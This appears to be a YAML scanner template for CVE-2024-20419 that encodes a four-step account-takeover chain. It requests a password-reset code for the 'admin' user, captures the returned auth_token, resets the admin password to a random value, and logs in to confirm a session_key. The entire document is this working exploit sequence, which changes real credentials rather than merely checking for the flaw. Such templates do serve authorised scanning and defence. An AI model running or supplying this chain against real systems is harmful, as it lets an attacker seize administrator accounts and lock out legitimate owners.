cve-id: CVE-2024-20419
set:
  password: '{{string1}}{{string2}}!'
  string1: '{{to_upper(rand_text_alphanumeric(7))}}'
  string2: '{{to_lower(rand_text_alphanumeric(7))}}'
  username: admin
rules:
- method: GET
  path: /backend/settings/oauth_adfs?hostname=polar
  expression: 'response.body.bcontains(b"enabled") && response.body.bcontains(b"redirect") '
- method: POST
  path: /backend/reset_password/generate_code
  headers:
    Content-Type: application/json
  body: |
    {"uid": "admin"}
  expression: 'response.body.bcontains(b"uid") && response.body.bcontains(b"auth_token") '
- method: POST
  path: /backend/reset_password
  headers:
    Content-Type: application/json
  body: |
    {"uid": "admin","auth_token":"{{auth_token}}", "password":"{{password}}","password_confirmation":"{{password}}","common_name":""}
  expression: 'response.body.bcontains(b"statusOK") '
- method: POST
  path: /backend/auth/identity/callback
  headers:
    Content-Type: application/json
  body: |
    {"username":"{{username}}","password":"{{password}}"}
  expression: 'response.body.bcontains(b"session_key") && response.body.bcontains(b"role") '
severity: critical
type: passwordreset
